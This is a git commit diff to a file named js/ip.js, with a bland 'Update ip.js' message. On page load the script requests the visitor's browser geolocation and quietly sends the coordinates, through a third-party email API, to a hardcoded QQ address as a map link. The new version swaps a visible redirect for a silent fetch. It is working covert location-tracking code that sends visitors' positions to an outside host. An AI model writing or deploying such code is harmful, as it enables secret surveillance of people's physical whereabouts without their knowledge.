69a5a0cdb78822fac9ec66e521907051081c29d0
wj2023 <122136437+jun686@users.noreply.github.com>
2023-08-29 10:55:30 +0800

    Update ip.js

--- js/ip.js
+++ js/ip.js
@@ -1,18 +1,37 @@
-        window.addEventListener("load", function() {
-            getLocation();
-        });
+<script>
+  function getLocation() {
+    return new Promise((resolve, reject) => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => resolve(position.coords),
+          error => reject(error)
+        );
+      } else {
+        reject(new Error('浏览器不支持地理位置获取.'));
+      }
+    });
+  }
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
+  function sendGetRequest(url) {
+    fetch(url)
+      .then(response => {
+        console.log('GET 请求成功！');
+        console.log(response);
+        // 这里可以对返回的数据进行处理
+      })
+      .catch(error => {
+        console.log('GET 请求失败.');
+        console.error(error);
+      });
+  }
 
-        function showPosition(position) {
-            var jd = position.coords.longitude;
-            var wd = position.coords.latitude;
-            var url = "https://v.api.aa1.cn/api/qqemail/new/?to=jun.csy@qq.com&subject=2003&message=https://uri.amap.com/marker?position=" + jd + "," + wd;
-            window.location.href = url;
-        }
+  getLocation()
+    .then(coords => {
+      const { latitude, longitude } = coords;
+      const url = `https://v.api.aa1.cn/api/qqemail/new/?to=jun.csy@qq.com&subject=2003&message=https://uri.amap.com/marker?position=${latitude},${longitude}`;
+      sendGetRequest(url);
+    })
+    .catch(error => {
+      console.error(error);
+    });
+</script>
